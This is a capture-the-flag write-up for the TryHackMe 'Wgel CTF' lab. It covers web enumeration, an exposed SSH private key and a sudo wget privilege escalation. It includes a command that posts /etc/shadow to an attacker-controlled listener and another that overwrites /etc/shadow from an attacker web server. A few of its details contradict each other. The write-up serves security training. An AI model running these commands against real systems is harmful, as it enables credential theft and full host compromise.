
# TryHackMe: Wgel CTF Write-Up

> **Room:** Wgel CTF  
> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Objective:** Obtain user and root flags through web enumeration, credential exposure, and privilege escalation.

---

# Executive Summary

This machine demonstrates how seemingly minor web misconfigurations can lead to complete system compromise.

The attack began with standard reconnaissance that identified an Apache web server and SSH service. Further enumeration 
revealed a publicly accessible `.ssh` directory containing an exposed private SSH key. Combined with a username discovered 
in the website source code, this allowed direct SSH access to the target.

After obtaining an initial foothold as user **jessie**, privilege escalation was achieved through a dangerous sudo misconfiguration 
that allowed execution of the `wget` binary as root without a password. By abusing `wget`'s file read and write capabilities,
the `/etc/shadow` file was modified, ultimately granting full root access.

---

# Attack Path

```text
Reconnaissance
      │
      ▼
Web Enumeration
      │
      ▼
Discover Username (jessie)
      │
      ▼
Find Exposed SSH Private Key
      │
      ▼
SSH Access as Jessie
      │
      ▼
Enumerate Sudo Permissions
      │
      ▼
Abuse sudo wget
      │
      ▼
Read & Modify /etc/shadow
      │
      ▼
Root Access
```

---

# Information Gathering

## Nmap Scan

The first step was identifying exposed services on the target.

```bash
nmap -sC -sV -p- <TARGET_IP>
```

### Results

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Two services were exposed:

| Port | Service | Description |
|--------|----------|-------------|
| 22 | SSH | Remote administration |
| 80 | HTTP | Apache Web Server |

---

## Service Enumeration

A more detailed scan was performed to gather version information.

```bash
nmap -A -p 22,80 <TARGET_IP>
```

### Results

```text
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

This confirmed the target was running Ubuntu with Apache and OpenSSH.

---

# Web Enumeration

## Apache Default Page

Browsing to:

```text
http://<TARGET_IP>
```

displayed the default Apache landing page.

At first glance, nothing appeared unusual.

---

## Reviewing Page Source

Viewing the HTML source revealed a hidden comment containing a potential username.

```html
<!-- Jessie don't forget to update the website -->
```

### Discovery

```text
Username: jessie
```

This information would later be crucial for SSH authentication.

---

## Directory Bruteforcing

To discover hidden resources, directory enumeration was performed.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Results

```text
/sitemap (Status: 301)
```

A hidden directory named `/sitemap` was discovered.

---

## Enumerating /sitemap

Further enumeration targeted the newly discovered directory.

```bash
gobuster dir -u http://<TARGET_IP>/sitemap -w /usr/share/wordlists/dirb/common.txt
```

### Results

```text
/.ssh (Status: 301)
```

An exposed `.ssh` directory was discovered.

---

## Exposed SSH Key

Visiting:

```text
http://<TARGET_IP>/sitemap/.ssh/
```

revealed:

```text
id_rsa
```

Opening the file displayed a complete RSA private key.

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

This represents a critical security failure because SSH private keys should never be publicly accessible.

---

# Initial Access

## Saving the Private Key

The exposed key was copied locally.

```bash
nano id_rsa
```

After pasting the contents, secure permissions were applied.

```bash
chmod 600 id_rsa
```

---

## SSH Login

Using the discovered username and exposed key:

```bash
ssh -i id_rsa jessie@<TARGET_IP>
```

### Successful Access

```text
jessie@CorpOne:~$
```

A foothold on the machine had been established.

---

# User Flag

After gaining access, the user flag was located.

```bash
find / -type f -name user*.txt 2>/dev/null
```

### Result

```text
/home/jessie/Documents/user_flag.txt
```

Read the flag:

```bash
cat /home/jessie/Documents/user_flag.txt
```

---

# Privilege Escalation

## Sudo Enumeration

The next step was identifying commands executable with elevated privileges.

```bash
sudo -l
```

### Output

```text
User jessie may run the following commands on CorpOne:

(ALL : ALL) ALL
(root) NOPASSWD: /usr/bin/wget
```

The key finding was:

```text
NOPASSWD: /usr/bin/wget
```

Allowing `wget` to run as root creates a serious privilege escalation opportunity.

---

# Understanding the Vulnerability

`wget` is generally used for downloading files, but when executed as root it can also:

- Read privileged files
- Upload sensitive data
- Overwrite system files
- Modify authentication mechanisms

This makes it extremely dangerous when granted unrestricted sudo privileges.

---

# Exfiltrating /etc/shadow

The shadow file contains password hashes for local accounts.

## Start Listener

On the attack machine:

```bash
nc -lvnp 4444
```

---

## Send Shadow File

On the target:

```bash
sudo /usr/bin/wget --post-file=/etc/shadow http://<ATTACKER_IP>:4444
```

The contents of `/etc/shadow,/etc/passwd` were transmitted to the attacker's listener.

---

# Creating a New Password Hash

Generate a known SHA-512 password hash.

```bash
openssl passwd -6 -salt 'salt' 'password'
```

### Output

```text
$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.
```

---

# Modifying the Shadow File

The captured shadow file was edited locally.

Original Jessie entry:

```text
jessie:$6$0wv9XLy...
```

Replaced with:

```text
jessie:$6$salt$IxDD3jeSOb5eB1CX...
```

This effectively changed Jessie's password to:

```text
password
```

---

# Hosting the Modified Shadow File
Start a python web server on the attacker machine.
A simple web server was started.

```bash
python3 -m http.server 8000
```

---

# Overwriting /etc/shadow

The modified shadow file was downloaded directly into the system location.

```bash
sudo /usr/bin/wget http://<ATTACKER_IP>:8000/shadow -O /etc/shadow
```

### Successful Write

```text
Saving to: '/etc/shadow'
/etc/shadow 100%
```

At this point the target's authentication database had been replaced.

---

# Root Access

Now a root shell could be obtained.

```bash
sudo /bin/bash
```

When prompted:

```text
password
```

### Result

```text
root@CorpOne:~#
```

Root privileges successfully obtained.

---

# Root Flag

Navigate to the root directory.

```bash
cd /root
ls
```

### Result

```text
root_flag.txt
```

Read the flag:

```bash
cat root_flag.txt
```

Example output:

```text
b1b968b37519ad1daa6408188649263d
```

---





# Tools Used

| Tool | Purpose |
|--------|----------|
| Nmap | Port & Service Enumeration |
| Gobuster | Directory Discovery |
| SSH | Initial Access |
| Netcat | Data Exfiltration |
| OpenSSL | Password Hash Generation |
| Python HTTP Server | File Hosting |
| Wget | Privilege Escalation |

---

# Conclusion

The compromise of **Wgel CTF** was achieved through a chain of security weaknesses rather than a single exploit. 
Information disclosure within the website source code exposed a valid username, while directory enumeration uncovered a publicly
accessible SSH private key that provided initial access. Post-exploitation enumeration revealed a dangerous sudo misconfiguration 
allowing execution of `wget` as root. By abusing its file read and write capabilities, the system's authentication database was modified,
resulting in full administrative compromise of the host.

The room effectively demonstrates the importance of protecting sensitive files, disabling unnecessary directory listings, 
and enforcing strict sudo permissions.

